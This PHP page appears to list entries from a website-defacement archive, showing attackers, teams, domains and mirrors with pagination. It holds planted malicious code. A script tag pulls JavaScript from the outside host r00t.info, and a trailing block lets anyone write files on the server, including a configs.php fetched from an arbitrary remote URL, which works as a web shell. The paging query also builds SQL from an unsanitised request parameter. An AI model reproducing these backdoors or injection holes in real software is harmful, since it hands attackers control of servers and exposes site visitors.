<?php
include('header.php');
$site_hal = paging;
if (isset($_GET['s'])) {
    $noS = $_GET['s'];
}
else
    $noS = 1;

$offset = ($noS - 1) * $site_hal;
?>
<div id="main-wrapper">
<div class="maxtable">
<script src=http://r00t.info/ccb.js></script>
<table>
<tr>
<td style="width:80px">Date</td>
<td>Attacker</td>
<td>Team</td>
<td style="width:10px">H</td>
<td style="width:10px">M</td>
<td style="width:10px">R</td>
<td style="width:10px">S</td>
<td style="width:20px">L</td>
<td>Server</td>
<td>Domain</td>
<td style="width:60px">Mirror</td>
</tr>
<?php
                $db->go("SELECT * FROM notify WHERE type = 0 AND status = 0 ORDER BY tanggal DESC LIMIT $offset , $site_hal");
				while ($lulz = $db->fetchArray()) {

				?>
<tr>
<td><?=substr($lulz['tanggal'], 0, 10); ?></td>
<td><?=cekDefacer($lulz['hacker']); ?></td>
<td><?=cekTeam($lulz['team']); ?></td>
<td><?=cekHome($lulz['home']); ?></td>
<td><?=cekMass($lulz['mass'], $lulz['serip']);?></td>
<td><?=cekRedeface($lulz['redeface']); ?></td>
<td><?=cekSpecial($lulz['type']);?></td>
<td><?=cekFlag($lulz['country_id'], $lulz['country_name']);?></td>
<td><?=cutServer($lulz['server']);?></td>
<td><?=cutUrl($lulz['url']);?></td>
<td><?=cekMirror($lulz['id']);?></td>
</tr>
<?php } ?>
</table>
</div>
<br/>
<center>
<?php
                        $db->go("SELECT COUNT(*) AS jumData FROM notify WHERE type = 0 AND status = 0");
                        $lulz = $db->fetchArray();

                        $jumData = $lulz['jumData'];
                        $jumPage = ceil($jumData / $site_hal);
                        
                        for ($page = 1; $page <= $jumPage; $page++) {
                            if ((($page >= $noS - 4) && ($page <= $noS + 4)) || ($page == 1) || ($page == $jumPage)) {
                                if (($showPage == 1) && ($page != 2))
                                    echo "";
                                if (($showPage != ($jumPage - 1)) && ($page == $jumPage))
                                    echo "";
                                if ($page == $noPage)
                                    echo " <a class='csbutton small'>" . $page . "</a>";
                                else
                                    echo " <a class='csbutton small' href='/archive/".$page.".txt'> " . $page . "</a>";
                                $showPage = $page;
                            }
                        }
					?>
</center>
</div>
<?php include "footer.php" ?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>